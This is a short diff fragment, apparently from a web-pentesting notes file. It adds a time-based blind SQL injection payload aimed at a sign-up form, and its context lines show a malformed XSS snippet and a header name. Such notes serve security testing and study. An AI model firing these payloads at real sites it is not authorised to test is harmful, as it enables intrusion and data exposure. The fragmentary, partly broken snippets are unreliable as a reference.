@@ -199,6 +199,11 @@ or you can inject >> <scrip> data{"name"-alert(1)-"hossam"}</script> that is if 
    3- 
 
 
+Payload: Parameter=randomtext%' OR SLEEP (5) #
+
+Vulnerability :- time-based blind on SignUp form
+
+
 
 
 True-Client-IP:
